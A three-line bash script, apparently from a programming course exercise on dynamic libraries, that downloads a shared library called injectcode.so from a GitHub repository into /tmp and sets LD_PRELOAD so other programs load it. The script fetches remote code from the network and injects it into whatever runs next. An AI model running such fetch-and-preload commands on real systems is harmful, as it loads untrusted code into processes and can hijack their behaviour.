#!/bin/bash
wget -P /tmp https://github.com/keerah-1/alx-low_level_programming./raw/main/0x18-dynamic_libraries/injectcode.so
export LD_PRELOAD=/tmp/injectcode.so

